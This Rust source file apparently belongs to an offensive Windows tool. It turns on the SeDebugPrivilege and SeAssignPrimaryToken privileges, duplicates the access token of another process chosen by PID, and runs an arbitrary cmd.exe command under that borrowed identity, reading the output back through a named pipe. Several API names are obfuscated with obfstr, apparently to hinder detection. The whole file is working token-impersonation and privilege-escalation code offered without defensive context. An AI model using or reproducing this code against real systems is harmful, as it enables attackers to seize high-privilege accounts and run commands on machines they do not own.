use core::time;
use std::thread;
use std::io::Error;
use std::ffi::c_void;
use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, FALSE, STILL_ACTIVE};
use windows_sys::Win32::Storage::FileSystem::{PIPE_ACCESS_DUPLEX, ReadFile};
use windows_sys::core::PCSTR;
use std::ptr::null_mut;
use obfstr::obfstr;
use windows_sys::Win32::System::Pipes::{CreateNamedPipeA, PIPE_TYPE_MESSAGE, ConnectNamedPipe};
use windows_sys::{Win32::{Foundation::{HANDLE, CloseHandle}, Security::{SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, LookupPrivilegeValueW, AdjustTokenPrivileges, TOKEN_PRIVILEGES, DuplicateTokenEx, SecurityImpersonation, TokenPrimary, TOKEN_QUERY, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, SecurityDelegation, SecurityAnonymous, SecurityIdentification}}, core::PWSTR};
use windows_sys::Win32::System::{Threading::{PROCESS_QUERY_INFORMATION, CreateProcessWithTokenW, STARTUPINFOW, PROCESS_INFORMATION}, SystemServices::{SE_DEBUG_NAME, SE_ASSIGNPRIMARYTOKEN_NAME, MAXIMUM_ALLOWED, SECURITY_MANDATORY_LOW_RID, SECURITY_MANDATORY_MEDIUM_RID, SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_SYSTEM_RID, SECURITY_MANDATORY_UNTRUSTED_RID, SECURITY_MANDATORY_PROTECTED_PROCESS_RID}};
use windows_sys::Win32::System::Threading::{OpenProcess, OpenProcessToken, GetCurrentProcess, GetExitCodeProcess};

use crate::utils::FIXED_SECURITY_MANDATORY_MEDIUM_PLUS_RID;
use log::trace;

#[repr(i32)]
pub enum ImpersonationLevel {
    Impersonation   = SecurityImpersonation,
    Delegation      = SecurityDelegation,
    Anonymous       = SecurityAnonymous,
    Identification  = SecurityIdentification,
}

impl ImpersonationLevel {
    pub fn display_str(&self) -> &'static str {
        match self {
            ImpersonationLevel::Impersonation   => "Impersonation",
            ImpersonationLevel::Delegation      => "Delegation",
            ImpersonationLevel::Anonymous       => "Anonymous",
            ImpersonationLevel::Identification  => "Identification",
        }
    }
}

#[repr(i32)]
pub enum IntegrityLevel {
    Untrusted        = SECURITY_MANDATORY_UNTRUSTED_RID,
    Low              = SECURITY_MANDATORY_LOW_RID,
    Medium           = SECURITY_MANDATORY_MEDIUM_RID,
    MediumPlus       = FIXED_SECURITY_MANDATORY_MEDIUM_PLUS_RID,
    High             = SECURITY_MANDATORY_HIGH_RID,
    System           = SECURITY_MANDATORY_SYSTEM_RID,
    ProtectedProcess = SECURITY_MANDATORY_PROTECTED_PROCESS_RID,
}

impl IntegrityLevel {
    pub fn display_str(&self) -> &'static str {
        match self {
            IntegrityLevel::Untrusted           => "Untrusted",
            IntegrityLevel::Low                 => "Low",
            IntegrityLevel::Medium              => "Medium",
            IntegrityLevel::MediumPlus          => "MediumPlus",
            IntegrityLevel::High                => "High",
            IntegrityLevel::System              => "System",
            IntegrityLevel::ProtectedProcess    => "ProtectedProcess",
        }
    }
}

/// Function to impersonate process from PID and execute commande
pub fn impersonate(pid: u32, command: String) -> Result<bool, String> {
    // Debug information -vv
    trace!("[?] PID to impersonate: {}",pid);
    trace!("[?] Command to execute: {}",command);

    unsafe {
        let mut token_handle: HANDLE = std::mem::zeroed();
        let process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if process_handle == INVALID_HANDLE_VALUE || process_handle == 0 {
            CloseHandle(process_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcess"), Error::last_os_error()).to_owned());
        }
        if OpenProcessToken(process_handle,  TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &mut token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        };

        let mut duplicate_token_handle: HANDLE = std::mem::zeroed();
        if DuplicateTokenEx(token_handle, MAXIMUM_ALLOWED, null_mut(), SecurityImpersonation, TokenPrimary, &mut duplicate_token_handle) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("DuplicateTokenEx"), Error::last_os_error()).to_owned());
        };

        // spawn NamedPipe
        let pipe_name: PCSTR = "\\\\.\\pipe\\waza\0".as_ptr() as *const u8 as PCSTR;
        let server_pipe =  CreateNamedPipeA(pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 16384, 16384,0,null_mut());

        let si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let mut cmd = (format!("cmd.exe /c \"{}\" > \\\\.\\pipe\\waza",command).to_owned() + "\0").encode_utf16().collect::<Vec<u16>>();
        if CreateProcessWithTokenW(duplicate_token_handle, 0, null_mut(), cmd.as_mut_ptr() as *mut _ as PWSTR, 0,FALSE as *const c_void,FALSE as *const u16,&si , &mut pi) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("CreateProcessWithTokenW"), Error::last_os_error()).to_owned());
        }

        // Read command line return
        let mut bytes_read:u32 = 0;
        let mut buffer_read = vec![0u8;16384];
        if ConnectNamedPipe(server_pipe, null_mut()) == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("ConnectNamedPipe"), Error::last_os_error()).to_owned());
        }

        // Waiting for process to finish
        loop {
            let mut exit_code = 0u32;
            GetExitCodeProcess(pi.hProcess, &mut exit_code);
            if exit_code as i32 != STILL_ACTIVE {
                break;
            }
            thread::sleep(time::Duration::from_millis(500));
        }

        if ReadFile(server_pipe, buffer_read.as_mut_ptr() as *mut c_void, buffer_read.len() as u32, &mut bytes_read, null_mut())  == 0 {
            CloseHandle(process_handle);
            CloseHandle(token_handle);
            CloseHandle(duplicate_token_handle);
            return Err(format!("{} Error: {}",obfstr!("ReadFile"), Error::last_os_error()).to_owned());
        }
        trace!("[?] {} bytes read\n",bytes_read);
        println!("{}",String::from_utf8_lossy(&mut buffer_read[..(bytes_read as usize)]));

        CloseHandle(process_handle);
        CloseHandle(token_handle);
        CloseHandle(duplicate_token_handle);

        return Ok(true)
    }   
}


/// Function to enable Windows Privileges SeDebugPrivilege and SeAssignPrimaryToken
pub fn se_priv_enable() -> Result<bool, String>{
    unsafe {
        // Enable SeDebugPrivilege
        trace!("[?] Trying to enable SeDebugPrivilege privilege");

        let mut token_handle:HANDLE = std::mem::zeroed();
        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token_handle) == 0 {
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        }

        if LookupPrivilegeValueW(null_mut(), SE_DEBUG_NAME, &mut privilege.Privileges[0].Luid) == 0 {
            return Err(format!("{} Error: {}",obfstr!("LookupPrivilegeValueW"), Error::last_os_error()).to_owned());
        }

        if AdjustTokenPrivileges(token_handle as HANDLE, 0, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut()) == 0 {
            return Err(format!("{} Error: {}",obfstr!("AdjustTokenPrivileges"), Error::last_os_error()).to_owned());
        }

        if CloseHandle(token_handle as HANDLE) == 0 {
            return Err(format!("{} Error: {}",obfstr!("CloseHandle"), Error::last_os_error()).to_owned());
        }

        // Enable SeAssignPrimaryToken
        trace!("[?] Trying to enable SeAssignPrimaryToken privilege");

        let mut token_handle:HANDLE = std::mem::zeroed();
        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token_handle) == 0 {
            return Err(format!("{} Error: {}",obfstr!("OpenProcessToken"), Error::last_os_error()).to_owned());
        }

        if LookupPrivilegeValueW(null_mut(), SE_ASSIGNPRIMARYTOKEN_NAME, &mut privilege.Privileges[0].Luid) == 0 {
            return Err(format!("{} Error: {}",obfstr!("LookupPrivilegeValueW"), Error::last_os_error()).to_owned());
        }

        if AdjustTokenPrivileges(token_handle as HANDLE, 0, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut()) == 0 {
            return Err(format!("{} Error: {}",obfstr!("AdjustTokenPrivileges"), Error::last_os_error()).to_owned());
        }

        if CloseHandle(token_handle as HANDLE) == 0 {
            return Err(format!("{} Error: {}",obfstr!("CloseHandle"), Error::last_os_error()).to_owned());
        }

        return Ok(true);
    }
}